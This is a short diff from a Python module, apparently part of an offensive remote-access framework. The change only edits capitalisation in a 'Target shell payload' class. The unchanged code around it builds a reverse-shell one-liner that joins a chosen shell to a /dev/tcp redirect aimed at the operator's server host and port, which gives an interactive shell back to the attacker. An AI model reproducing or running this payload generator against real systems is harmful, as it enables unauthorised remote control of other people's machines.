@@ -21,12 +21,12 @@
 from core import helper as h
 class payload:
 	def __init__(self):
-		self.name = "Target Shell payload"
+		self.name = "Target shell payload"
 		self.description = "Creates a shell payload."
 		self.usage = "Run in terminal."
 
 	def run(self,server):
-		shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+		shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
 		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
 		backend = len(payload)
 		print h.WHITE + "-"*backend + h.ENDC
